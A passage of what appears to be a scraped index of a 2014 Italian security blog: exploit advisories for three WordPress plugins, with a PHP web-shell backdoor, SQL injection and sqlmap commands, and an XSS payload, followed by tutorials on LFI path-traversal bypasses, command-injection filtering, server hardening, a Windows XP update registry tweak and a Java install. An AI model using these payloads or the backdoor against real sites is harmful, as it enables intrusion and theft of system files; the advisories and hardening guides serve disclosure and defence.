\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;;\r$cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]);\rsystem($cmd);\recho \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\rdie;\r}\r?\u0026gt;\rUsage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd\r-----------------------------298331869519772--\r#####################\r# Backdoor Location:\rhttp://IP_VICTIM/wp-content/uploads/download-manager-files/shell.php?cmd=cat+/etc/passwd\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/07/12/wordpress-download-manager-2-6-8/","summary":"######################\r# Exploit Title : WordPress Download Manager 2.6.8 Shell Upload Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : www.wpdownloadmanager.com\r# Software Link : http://downloads.wordpress.org/plugin/download-manager.zip\r# Date : 2014-07-11\r# Tested on : Linux / Mozilla Firefox / WordPress Download Manager 2.6.8 Free Version\r# # # WORK ONLY ON SERVER WITH .HTACCESS FILES DISABLED\r######################\r# Location : http://IP_VICTIM/wp-content/plugins/download-manager/wpdm-add-new-file.php\r######################\r# Description :\rWordPress Download Manager 2.","title":"WordPress Download Manager 2.6.8 Shell Upload Vulnerability"},{"content":"\n######################\r# Exploit Title : WordPress BSK PDF Manager 1.3.2 Authenticated SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.bannersky.com/bsk-pdf-manager/\r# Software Link : http://downloads.wordpress.org/plugin/bsk-pdf-manager.zip\r# Date : 2014-07-04\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Linux / sqlmap 1.0-dev-5b2ded0\r######################\r# Location : http://localhost/wp-content/plugins/compfight/compfight-search.php\r######################\r# Vulnerable code :\r[claudio@localhost ~]$ grep -R GET bsk-pdf-manager/\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: if(isset($_GET[\u0026#39;view\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;view\u0026#39;]){\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: $categories_curr_view = trim($_GET[\u0026#39;view\u0026#39;]);\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: if(isset($_GET[\u0026#39;categoryid\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;categoryid\u0026#39;]){\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: $category_id = trim($_GET[\u0026#39;categoryid\u0026#39;]);\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: if(isset($_GET[\u0026#39;view\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;view\u0026#39;]){\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: $lists_curr_view = trim($_GET[\u0026#39;view\u0026#39;]);\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: if(isset($_GET[\u0026#39;pdfid\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;pdfid\u0026#39;]){\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: $pdf_id = trim($_GET[\u0026#39;pdfid\u0026#39;]);\r$category_id = trim($_GET[\u0026#39;categoryid\u0026#39;]);\r$pdf_id = trim($_GET[\u0026#39;pdfid\u0026#39;]);\r######################\rExploit Code via Browser:\rhttp://127.0.0.1/wp-admin/admin.php?page=bsk-pdf-manager-pdfs\u0026amp;view=edit\u0026amp;pdfid=1 and 1=2\rhttp://127.0.0.1/wp-admin/admin.php?page=bsk-pdf-manager\u0026amp;view=edit\u0026amp;categoryid=1 and 1=2\rExploit Code via sqlmap:\rsqlmap --cookie=\u0026#39;INSERT_WORDPRESS_COOKIE_HERE\u0026#39; -u \u0026#34;http://10.0.0.67/wp-admin/admin.php?page=bsk-pdf-manager\u0026amp;view=edit\u0026amp;categoryid=1\u0026#34; -p categoryid\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/07/10/wordpress-bsk-pdf-manager-sqlinj/","summary":"######################\r# Exploit Title : WordPress BSK PDF Manager 1.3.2 Authenticated SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.bannersky.com/bsk-pdf-manager/\r# Software Link : http://downloads.wordpress.org/plugin/bsk-pdf-manager.zip\r# Date : 2014-07-04\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r# Linux / sqlmap 1.0-dev-5b2ded0\r######################\r# Location : http://localhost/wp-content/plugins/compfight/compfight-search.php\r######################\r# Vulnerable code :\r[claudio@localhost ~]$ grep -R GET bsk-pdf-manager/\rbsk-pdf-manager/inc/bsk-pdf-dashboard.php: if(isset($_GET[\u0026#39;view\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;view\u0026#39;]){\rbsk-pdf-manager/inc/bsk-pdf-dashboard.","title":"WordPress BSK PDF Manager 1.3.2 SQL Injection"},{"content":"######################\r# Exploit Title : WordPress Compfight 1.4 Authenticated Cross Site Scripting\r# Exploit Author : Claudio Viviani - HomeLab IT\r# Vendor Homepage : http://wordpress.org/plugins/easy-banners/\r# Software Link : http://downloads.wordpress.org/plugin/compfight.1.4.zip\r# Date : 2014-07-03\r# Tested on : Windows 7 / Mozilla Firefox\r######################\r# Location : http://localhost/wp-content/plugins/compfight/compfight-search.php\r######################\r# Vulnerable code :\rif (!$search_value) {\r$input_text = \u0026#39;Enter Keyword(s)\u0026#39;;\r} else {\r$input_text = $search_value;\r}\rif ($show_title) {\r$output .= \u0026#39;\u0026lt;h3 class=\u0026#34;cf_search_title\u0026#34;\u0026gt;Compfight\u0026lt;/h3\u0026gt;\u0026#39;;\r$output .= \u0026#39;\u0026lt;p class=\u0026#34;cf_search_subtitle\u0026#34;\u0026gt;Locate the visual inspiration\u0026lt;br/\u0026gt;you need. Super fast!\u0026lt;/p\u0026gt;\u0026#39;;\r}\r$output .= \u0026#39;\u0026lt;form method=\u0026#34;GET\u0026#34; action=\u0026#34;\u0026#34; id=\u0026#34;cf-form\u0026#34;\u0026gt;\u0026#39;;\r$output .= \u0026#39;\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;search-value\u0026#34; id=\u0026#34;search-value\u0026#34; value=\u0026#34;\u0026#39; . $input_text . \u0026#39;\u0026#34; onClick=\u0026#34;javascript:if(this.value==\\\u0026#39;Enter Keyword(s)\\\u0026#39;) { this.value = \\\u0026#39;\\\u0026#39;; };\u0026#34; /\u0026gt;\u0026#39;;\r$output .= \u0026#39;\u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;search\u0026#34; id=\u0026#34;search\u0026#34; value=\u0026#34;Search\u0026#34; class=\u0026#34;button\u0026#34; /\u0026gt;\u0026#39;;\r$output .= \u0026#39;\u0026lt;/form\u0026gt;\u0026#39;;\r$input_text variable not sanitized\r######################\rExploit Code:\rhttp://localhost/plugins/compfight/compfight-search.php?search-value=\u0026#39;\u0026#34;/\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026amp;search=Search\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/07/03/wordpress-compfight-xss/","summary":"######################\r# Exploit Title : WordPress Compfight 1.4 Authenticated Cross Site Scripting\r# Exploit Author : Claudio Viviani - HomeLab IT\r# Vendor Homepage : http://wordpress.org/plugins/easy-banners/\r# Software Link : http://downloads.wordpress.org/plugin/compfight.1.4.zip\r# Date : 2014-07-03\r# Tested on : Windows 7 / Mozilla Firefox\r######################\r# Location : http://localhost/wp-content/plugins/compfight/compfight-search.php\r######################\r# Vulnerable code :\rif (!$search_value) {\r$input_text = \u0026#39;Enter Keyword(s)\u0026#39;;\r} else {\r$input_text = $search_value;\r}\rif ($show_title) {\r$output .","title":"WordPress Compfight \u003c= 1.4 Authenticated Reflected XSS Vulnerability"},{"content":"\nNella prima parte dell’articolo ho spiegato cosa è la vulnerabilità LFI soffermandomi anche su alcune tecniche di protezione a livello di programmazione, mentre in questo post affronterò l’aspetto sistemistico.\nPer circoscrivere l’area di lavoro di un applicativo web, e quindi di un eventuale Local File Inclusion, è possibile ricorrere almeno a tre soluzioni:\n Utilizzo della funzione php open_basedir Configurazione di un ambiente chroot per Apache Applicazione delle regole di selinux per Apache   PHP openbasedir anti LFI   La funzione php open_basedir permette di limitare l’area d’azione di un applicativo ed è possibile configurarla a livello globale o tramite virtualhost specifici.\nurl: www.miotestantilfi.it homedir: /web/htdocs/miotestantilfi Per le regole globali di php, quindi valide per tutti gli applicativi residenti sul server web, si deve modificare il file di configurazione php.ini .\nIl percorso del file php.ini può cambiare a seconda del tipo o versione di sistema operativo, ad esempio su Linux CentOS risiede dentro la directory /etc.\nUna volta editato il file basta aggiungere uno o più path nell’opzione open_basedir:\n; open_basedir, if set, limits all file operations to the defined directory ; and below. This directive makes most sense if used in a per-directory ; or per-virtualhost web server configuration file. This directive is ; *NOT* affected by whether Safe Mode is turned On or Off. ; http://www.php.net/manual/en/ini.sect.safe-mode.php#ini.open-basedir open_basedir = /mnt/pippo:/web/htdocs:/home/repositories Dopo aver salvato le modifiche è necessario riavviare il demone web.\nNell’esempio appena mostrato qualsiasi applicativo presente sul web server potrà navigare soltanto all’interno delle directory specificate, quindi la cartella /etc con relativo contenuto diventa inaccessibile.\nPer limitare un determinato applicativo php è possibile configurare un virtualhost di Apache:\n\u0026lt;VirtualHost *:80\u0026gt; ServerAdmin admin@miotestantilfi.it DocumentRoot /web/htdocs/miotestantilfi ServerName www.miotestantilfi.it php_admin_value open_basedir /web/htdocs/miotestantilfi/:/usr/share/pear/ \u0026lt;Directory /web/htdocs/miotestantilfi\u0026gt; AllowOverride All Order allow,deny allow from all \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Tramite php_admin_value all’interno del virtualhost è possibile richiamare la funzione php open_basedir.\nIn caso di un eventuale script affetto dalla vulnerabilità LFI, la pagina non potrà includere files al di fuori della propria home directory /web/htdocs/miotestantilfi.\nConfigurare il server web Apache in ambiente chroot   Un altro metodo per proteggersi dai Local File Inclusion è la configurazione del server web Apache in chroot.\nL’ambiente chroot non è altro che un sottosistema indipendente (chiamato jail) che permette di eseguire processi in un ambiente circoscritto e sicuro.\nCompromettendo l’applicativo php nella jail, un eventuale LFI andrebbe a leggere ad esempio il file /etc/passwd fittizzio e non quello del sistema root principale.\nQuesto argomento da parte mia era già stato affrontato qualche mese fa, quindi riporto il link:\nhttp://www.homelab.it/index.php/2014/04/02/apache-2-chroot-modsecurity-centos-6/\nApache e Selinux   Security-Enhanced Linux (SELinux) è un modulo implementato dalla versione 2.6 del kernel linux creato dalla famosa/famigerata NSA americana.\nQuesta infrastruttura fornisce tutte le interfacce possibili che consentono di controllare completamente l’accesso a tutti gli oggetti di sistema quando vengono avviate dalle azioni degli utenti. Questi sono, per esempio, l’apertura di un file, la creazione di una nuova cartella, o il mettere un demone in ascolto su una porta. Come funziona? Beh, SELinux si collega semplicemente all’interfaccia e impone l’uso di una politica di sicurezza al sistema. Dal punto di vista del amministratore che installa SELinux, questo sistema è semplicemente una caratteristica del kernel. Fonte: Linuxaria\nAttivando Selinux sul proprio sistema linux verrà impedito ad apache di accedere a file/directory non autorizzate.\nSu CentOS già dalla versione 5.x selinux viene abilitato di default all’installazione e il demone apache viene autorizzato a elaborare gli applicativi sotto la directory /var/www/html.\nPer dare i permessi selinux ad apache su altre directory basta eseguire i comandi:\n# chcon -v --type=httpd_sys_content_t /web/htdocs context of /web/htdocs changed to user_u:object_r:httpd_sys_content_t In maniera ricorsiva il comando diventa:\n# chcon -Rv --type=httpd_sys_content_t /web/htdocs Per controllare i permessi di file e cartelle basta utilizzare lo switch “-Z” del comando ls.\n# ls -Z /web | grep htdocs drwxr-xr-x root root user_u:object_r:httpd_sys_content_t htdocs Anche in questo caso un eventuale LFI verrebbe bloccato dalle policy di Selinux.\nQuesto è solo un piccolo anticipo per quanto riguarda Selinux e presto scriverò un articolo che spiegherà come muovere i primi passi, nel frattempo vi consiglio di documentarvi su questo fantastico modulo.\n","permalink":"https://www.homelab.it/index.php/2014/06/26/lfi-individuarli-e-proteggersi2/","summary":"Nella prima parte dell’articolo ho spiegato cosa è la vulnerabilità LFI soffermandomi anche su alcune tecniche di protezione a livello di programmazione, mentre in questo post affronterò l’aspetto sistemistico.\nPer circoscrivere l’area di lavoro di un applicativo web, e quindi di un eventuale Local File Inclusion, è possibile ricorrere almeno a tre soluzioni:\n Utilizzo della funzione php open_basedir Configurazione di un ambiente chroot per Apache Applicazione delle regole di selinux per Apache   PHP openbasedir anti LFI   La funzione php open_basedir permette di limitare l’area d’azione di un applicativo ed è possibile configurarla a livello globale o tramite virtualhost specifici.","title":"LFI – Come individuare e proteggersi dalla vulnerabilità Local File Inclusion Part.2"},{"content":"Proteggere i propri applicativi php è importantissimo sia, per l’integrità dei dati che del sistema.\nNello scorso articolo ho fatto una panoramica sulla vulnerabilità Local File Inclusion, mentre oggi lo scopo dei test sarà quello di applicare al codice php dei filtri command injection, ovvero normalizzare le richieste in input eliminando la possibilità di eseguire comandi non autorizzati.\nEsempi di command injection Qui di seguito riporto un esempio di script php (filter-injection.php) che passa tramite metodo $_GET gli argomenti al comando “ls” del sistema linux locale, così da elencare il contenuto della directory desiderata.\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php $cmd = \u0026#34;ls -lah \u0026#34; .$_GET[\u0026#39;path\u0026#39;]; system($cmd); ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html Inserendo nel browser l’url http://sito/filter-injection.php?path=/tmp sarà possibile visualizzare il contenuto della directory /tmp:\n\nUtilizzando i caratteri “\u0026amp;“, “;” o “|” come ben noto è possibile concatenare più comandi o redirigerne l’utoput di uno verso l’altro.\nEcco un esempio di come è possibile iniettare comandi in una pagina php non protetta “http://sito/filter-injection.php?path=/tmp | pwd“:\n\nTramite il carattere pipe è stato possibile far eseguire alla pagina php un comando non autorizzato, ovvero pwd.\nFiltri: escapeshellarg escapeshellcmd Per proteggere script php vulnerabili ai command injection vengono in aiuto due funzioni php:\n escapeshellarg escapeshellcmd  Una breve descrizione presa da php.net:\nescapeshellarg (PHP 4 \u0026gt;= 4.0.3, PHP 5)\nescapeshellarg — estrae una stringa da usare come un argomento della shell\nDescrizione string escapeshellarg ( string $arg )\nescapeshellarg() aggiunge le virgolette singole attorno ad una stringa ed elude ogni virgoletta semplice per permetterti di passare una stringa direttamente ad una funzione della shell a che questa venga trattata come un singolo argomento. Questa funzione dovrebbe essere usata per eludere argomenti individuali per funzioni della shell che giungano dall’input del utente. Le funzioni della shell includono exec(), system() e l’operatore backtick\nescapeshellcmd (PHP 4, PHP 5)\nescapeshellcmd — Elude i metacaratteri della shell\nDescrizione string escapeshellcmd ( string $command )\nescapeshellcmd() elude ogni carattere di una stringa che potrebbe essere usata per indurre un comando shell ad eseguire comandi arbitrari. Questa funzione dovrebbe essere usata per assicurarsi che ogni dato che giunga dall’input dell’utente venga neutralizzato prima di essere passato a funzioni come exec() o system() o all’operatore backtick .\nPer il test utilizzerò la funzione escapeshellarg modificando la pagina filter-injection-php in questo modo:\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php $cmd = \u0026#34;ls -lah \u0026#34;.escapeshellarg($_GET[\u0026#39;path\u0026#39;]); system($cmd); ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html Riscrivo nel browser l’url “http://sito/filter-injection.php?path=/tmp | pwd“:\n\nIl comando non è stato iniettato, dando uno sguardo al file error log di apache si nota:\nls: /tmp | pwd: No such file or directory\nRiferimenti Filtri command injection: escapeshellarg escapeshellcmd\nPentester Academy – SecurityTube.net\n  ","permalink":"https://www.homelab.it/index.php/2014/06/14/escapeshellarg-escapeshellcmd-command-injection/","summary":"Proteggere i propri applicativi php è importantissimo sia, per l’integrità dei dati che del sistema.\nNello scorso articolo ho fatto una panoramica sulla vulnerabilità Local File Inclusion, mentre oggi lo scopo dei test sarà quello di applicare al codice php dei filtri command injection, ovvero normalizzare le richieste in input eliminando la possibilità di eseguire comandi non autorizzati.\nEsempi di command injection Qui di seguito riporto un esempio di script php (filter-injection.","title":"Filtri command injection: escapeshellarg escapeshellcmd"},{"content":"\nLFI – Introduzione Analizzando pagine web dinamiche di vari siti o ad esempio dei CMS (WordPress, Drupal, Joomla) è possibile notare come gli sviluppatori ottimizzino il codice distribuendolo su più pagine.\nIn questo modo i programmatori evitano di creare file (ad esempio php) troppo grandi e di conseguenza meno chiari/flessibili.\nPer incorporare il contenuto di una pagina php dentro l’altra, vengono utilizzate le funzioni:\ninclude(\u0026lsquo;pagina2.php\u0026rsquo;);\ninclude_once(\u0026lsquo;pagina2.php\u0026rsquo;);\nrequire(\u0026lsquo;pagina2.php\u0026rsquo;);\nrequire_once(\u0026lsquo;pagina2.php\u0026rsquo;);\nCosa può accadere se il nome della pagine inclusa viene richiamata col metodo GET o POST senza l’inserimento di adeguati filtri?\nLa risposta è semplice: è possibile leggere file di sistema o scaricare il codice sorgente degli applicativi, questa vulnerabilità viene chiamata LFI Local File Inclusion.\nE’ importante precisare due punti per il corretto rilevamento della vulnerabilità:\n I files a cui avrà accesso la pagina affetta dal bug, devono avere almeno i permessi in lettura per l’utente Apache (o l’utente di riferimento del demone http) Il sistemista del web server non ha circoscritto l’area di lavoro dell’applicativo  Esempio vulnerabilità LFI Url server web: 10.0.0.70\nPagina Vuln: index.php\nQuesto è un esempio di codice php (index.php) che include il nome di un’altra pagina tramite metodo GET (variabile ID):\n\u0026lt;?php if ( isset( $_GET[\u0026#39;ID\u0026#39;] ) ) { include( $_GET[\u0026#39;ID\u0026#39;]); } ?\u0026gt; Qui di seguito invece il codice della pagina che verrà inclusa (pagina2.php):\n\u0026lt;?php echo \u0026#34;Pagina inclusa correttamente!\\n\u0026#34;; ?\u0026gt; Per testare la pagina basta aprire il browser ed inserire l’url “http://10.0.0.70/index.php?ID=pagina2” :\n\nIl problema della pagina index.php è che non esiste alcun controllo sul valore che le viene passato tramite GET, infatti è possibile scalare a ritroso le directory fino ad includere file di sistema.\nLa tecnica si chiama “Path Traversal” e vengono utilizzati principalmente i caratteri “..” .\nI caratteri “..” vengono utilizzati sia nei sistemi *nix che windows per tornare indietro di una directory, quindi è possibile concatenarli fino ad arrivare al file interessato:\nhttp://10.0.0.70/index.php?ID=../../../etc/passwd\n\nIl file /etc/passwd avendo accesso in lettura da parte di tutti gli utenti viene letto anche da apache, in questo caso sfruttando la vulnerabilità lfi ha è possibile avere la lista di tutti gli utenti di sistema.\nIn questo caso un possibile malintenzionato potrebbe già eseguire un brute-force mirato, scegliendo quale utente con relativa shell prendere di mira.\nNaturalmente i files sensibili dove può accedere in lettura soltanto l’utente root, ad esempio /etc/shadow, non possono essere letti da apache.\nPer risolvere questo problema spesso gli sviluppatori implementano soltanto l’estensione “.php” dentro il codice della pagina, precisamente nell’istruzione include:\n\u0026lt;?php if ( isset( $_GET[\u0026#39;ID\u0026#39;] ) ) { include( $_GET[\u0026#39;ID\u0026#39;] . \u0026#34;.php\u0026#34;); } ?\u0026gt; Così facendo viene aggiunta automaticamente la stringa “.php” a qualsiasi valore passato tramite GET.\nFino a poco tempo fa questo filtro veniva aggirato inserendo il carattere null “%00” in fondo all’url dell’indirizzo, in questo modo l’estensione del file richiamato veniva spezzata e quindi ignorata:\nhttp://10.0.0.70/index.php?ID=../../../etc/passwd%00\nQuesta tecnica è possibile attuarla fino alla versione 5.3.3 di php, infatti nella 5.3.4 è stata rilasciata una patch che permette di ignorare e non interpretare il carattere null.\nRedHat Enterprise e CentOS hanno reso disponibile la versione di php non affetta dal bug a Novembre 2013:\nhttps://rhn.redhat.com/errata/RHSA-2013-1615.html\nEsempi di Path Traversal per LFI Per contrastare le vulnerabilità lfi, molti applicativi web si limitano a normalizzare le query controllando che non siano presenti i caratteri “..” “../” o “..\\” .\nQuella che riporto di seguito è una lista di caratteri URL e UTF-8 encode che vengono utilizzati per aggirare i filtri:\nURL:\n %2e%2e%2f viene interpretato come ../ %2e%2e/ viene interpretato come ../ ..%2f viene interpretato come ../ %2e%2e%5c viene interpretato come ..\\  UTF-8:\n ..%c0%af viene interpretato come ../ ..%c1%9c viene interpretato come ..\\  La funzione php str_replace sembra essere efficace anche con gli url encode, per fare un test basta modificare la pagina index.php che è stata creata precedentemente.\nPer comodità eseguirò un test col browser testuale curl inserendo l’url econde %2e%2e%2f a discapito dei caratteri “../”\n[root@localhost lfi]# curl http://10.0.0.70/index.php?ID=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/redhat-release CentOS release 5.10 (Final) [root@localhost lfi]# Adesso modificherò la pagina php utilizzando la funzione str_replace per sostituire qualsiasi stringa “../” col carattere “_”\n\u0026lt;?php if ( isset( $_GET[\u0026#39;ID\u0026#39;] ) ) { $ID = $_GET[\u0026#39;ID\u0026#39;]; $ID = str_replace(\u0026#39;..\u0026#39;, \u0026#39;_\u0026#39;, $ID); echo \u0026#34;$ID\\n\u0026#34;; include( $ID ); } ?\u0026gt; Inserisco l’indirizzo nel browser:\n[root@localhost lfi]# curl http://10.0.0.70/index.php?ID=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/redhat-release etc/redhat-release \u0026lt;-- risultato echo [root@localhost lfi]# Come si può notare tutti i caratteri sono stati decodificati e sostituiti, infatti il file /etc/redhat.release non viene aperto.\nQuesto test LFI è stato effettuato su una CentOS 5.10 e php53-5.3.3-22.el5_10.\nScaricare file tramite LFI Come avevo specificato nell’introduzione, tramite lfi è possibile scaricare file dal server remoto come ad esempio i sorgenti delle pagine dinamiche.\nEsistono vari applicativi web che permettono di integrare o scaricare file di testo, foto, documenti pdf ecc.., e se non hanno un solido controllo nelle query possono essere sfruttate per scaricare file non autorizzati.\nUn famosissimo script noto per aver avuto grossi problemi di lfi si chiama “eLouai’s Force Downlaod” e nonostante sia vecchissimo è ancora diffuso in rete.\nE chiaro che se un malintenzionato riesce a scaricare la pagina index del sito, oltre agli accessi al database, può risalire a tutto il resto delle pagine\n\nIl plugin wordpress Download Shortcode è una piccola utility che permette di inserire link a file multimediali all’interno di shortcodes, basandosi sullo script eLouai’s Force Downlaod ma con una piccola modifica anti lfi:\n$filename = $_GET[\u0026#39;file\u0026#39;]; // Check for empty value or shenanigans if ( // From validate_file() in WP core false !== strpos( $filename, \u0026#39;..\u0026#39; ) || false !== strpos( $filename, \u0026#39;./\u0026#39; ) || \u0026#39;:\u0026#39; == substr( $filename, 1, 1 ) // Empty path || $filename == \u0026#34;\u0026#34; // Doesn\u0026#39;t exist || ! file_exists( $filename ) // Is a PHP file || strpos( $filename, \u0026#39;.php\u0026#39; ) ) exit(); strpos è una funzione di php che permette di estrarre porzioni da una stringa partendo dal primo carattere (valore 0).\nNello script soprastante il flusso viene interrotto se nella variabile $file (il nome del file passato tramite GET) esiste una stringa con i caratteri “..“, “./“, “.php”.\nInteressante la parte di codice “‘:’ == substr( $filename, 1, 1 )“, in questo caso viene controllato se il secondo carattere della stringa è il simbolo “:” che potrebbe essere utilizzato per includere file all’interno di unità di windows (C:\\windows, D:\\, F:\\, ecc…).\nQuesti sono alcuni esempi da cui partire per rendere i propri codici più sicuri contro LFI, nal prossimo articolo tratterò alcune soluzioni a livello sistemistico.\n","permalink":"https://www.homelab.it/index.php/2014/06/11/lfi-individuarli-e-proteggersi/","summary":"LFI – Introduzione Analizzando pagine web dinamiche di vari siti o ad esempio dei CMS (WordPress, Drupal, Joomla) è possibile notare come gli sviluppatori ottimizzino il codice distribuendolo su più pagine.\nIn questo modo i programmatori evitano di creare file (ad esempio php) troppo grandi e di conseguenza meno chiari/flessibili.\nPer incorporare il contenuto di una pagina php dentro l’altra, vengono utilizzate le funzioni:\ninclude(\u0026lsquo;pagina2.php\u0026rsquo;);\ninclude_once(\u0026lsquo;pagina2.php\u0026rsquo;);\nrequire(\u0026lsquo;pagina2.php\u0026rsquo;);\nrequire_once(\u0026lsquo;pagina2.php\u0026rsquo;);\nCosa può accadere se il nome della pagine inclusa viene richiamata col metodo GET o POST senza l’inserimento di adeguati filtri?","title":"LFI – Come individuare e proteggersi dalla vulnerabilità Local File Inclusion Part.1"},{"content":"\nIntroduzione Windows Embedded POSReady 2009 è il sistema operativo che si trova in molti dispositivi P.O.S e si basa su Windows XP.\nMicrosoft ha deciso di prolungare la manutenzione di questo sistema operativo per i prossimi cinque anni, dato che i pos sono utilizzati in esercenti commerciali con presenza di dati sensibili.\nCreando un semplice file .reg ad hoc è possibile far credere a Windows Update di avere un sistema Windows Embedded POSReady 2009.\nCreazione chiave registro Windows XP Creare un nuovo file di testo dal nome winupdate.txt e inserire le seguenti righe:\nWindows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\WPA\\PosReady] \u0026#34;Installed\u0026#34;=dword:00000001 Rinominare il file da winupdate.txt in winupdate.reg.\nInfine eseguire il file e acconsentire la modifica al registro di sistema.\nA questo punto sarete abilitati a scaricare i Security Update per qualsiasi versione di Windows XP.\nNote personali E’ chiaramente sconsigliato continuare ad utilizzare Windows XP, quindi applicate questo workaround solo in caso di estrema necessità!\n","permalink":"https://www.homelab.it/index.php/2014/05/29/come-scaricare-ed-installare-gli-aggiornamenti-critici-di-windows-xp-fino-al-2019/","summary":"Introduzione Windows Embedded POSReady 2009 è il sistema operativo che si trova in molti dispositivi P.O.S e si basa su Windows XP.\nMicrosoft ha deciso di prolungare la manutenzione di questo sistema operativo per i prossimi cinque anni, dato che i pos sono utilizzati in esercenti commerciali con presenza di dati sensibili.\nCreando un semplice file .reg ad hoc è possibile far credere a Windows Update di avere un sistema Windows Embedded POSReady 2009.","title":"Come scaricare ed installare gli aggiornamenti critici di Windows XP fino al 2019"},{"content":"Download ed installazione Java (ultima versione)   Aprire il browser e inserie l’indirizzo: http://www.oracle.com/technetwork/java/javase/overview/index.html\n  Cliccare sul bottone Download:\n  \nCliccare sull’icona Download:   \nSelezionare il bottone ratio “Accept License Agreement“:  \nScaricare il pacchetto rpm a seconda dell’architettura del proprio sistema:   jdk-8u5-linux-i586.rpm jdk-8u5-linux-x64.rpm   Copiare il file rpm tramite scp client (se la macchina CentOS 6 è remota).\n  Con i privilegi di root installare il pacchetto rpm (nel mio caso i586) :\n  [root@centos6 ~]# rpm -Uhv jdk-8u5-linux-i586.rpm Preparazione in corso... ########################################### [100%] 1:jdk ########################################### [100%] Unpacking JAR files... rt.jar... jsse.jar... charsets.jar... tools.jar... localedata.jar... jfxrt.jar... plugin.jar... javaws.jar... deploy.jar... [root@centos6 ~]# Tramite un editor di testo, creare il file “/etc/profile.d/jdk.sh“:  export JAVA_HOME=/usr/java/default export PATH=$PATH:$JAVA_HOME/bin export CLASSPATH=.:$JAVA_HOME/jre/lib:$JAVA_HOME/lib:$JAVA_HOME/lib/tools.jar Rileggere il file profile:  [root@centos6 ~]# source /etc/profile Controllare la presenza delle nuove variabili:  [root@centos6 ~]# env HOSTNAME=centos6 TERM=xterm SHELL=/bin/bash HISTSIZE=1000 SSH_CLIENT=10.0.0.64 55263 22 SSH_TTY=/dev/pts/0 USER=root LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01: MAIL=/var/spool/mail/root PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin:/usr/java/default/bin PWD=/root JAVA_HOME=/usr/java/default LANG=it_IT.UTF-8 HISTCONTROL=ignoredups SHLVL=1 HOME=/root LOGNAME=root CLASSPATH=.:/usr/java/default/jre/lib:/usr/java/default/lib:/usr/java/default/lib/tools.jar SSH_CONNECTION=10.0.0.64 55263 10.0.0.19 22 LESSOPEN=|/usr/bin/lesspipe.sh %s G_BROKEN_FILENAMES=1 _=/bin/env Creare un file d’esempio “test.java“:  class test { public static void main(String[] args) { System.out.println(\u0026#34;Hello World\u0026#34;); } } Compilare il file:  [root@centos6 ~]# javac test.java Eseguire il file:  [root@centos6 ~]# java test Hello World [root@centos6 ~]# Informazioni da wikipedia Java è un linguaggio di programmazione orientato agli oggetti, specificatamente progettato per essere il più possibile indipendente dalla piattaforma di esecuzione. Uno dei principi fondamentali del linguaggio è espresso dal motto write once, run anywhere (WORA): il codice compilato che viene eseguito su una piattaforma non deve essere ricompilato per essere eseguito su una piattaforma diversa. Il prodotto della compilazione è infatti in un formato chiamato bytecode che può essere eseguito da una qualunque implementazione di un processore virtuale detto Java Virtual Machine.\nAl 2014, Java risulta essere uno dei linguaggi di programmazione più usati al mondo, specialmente per applicazioni client-server, con un numero di sviluppatori stimato intorno ai 9 milioni.[1][2]\nIl linguaggio fu originariamente sviluppato da James Gosling e altri ingegneri presso Sun Microsystems, nel 2010 acquisita da Oracle Corporation, che è attualmente detentore del marchio registrato.[3]\nIl linguaggio deriva gran parte della sua sintassi dai linguaggi C e C++, ma ha 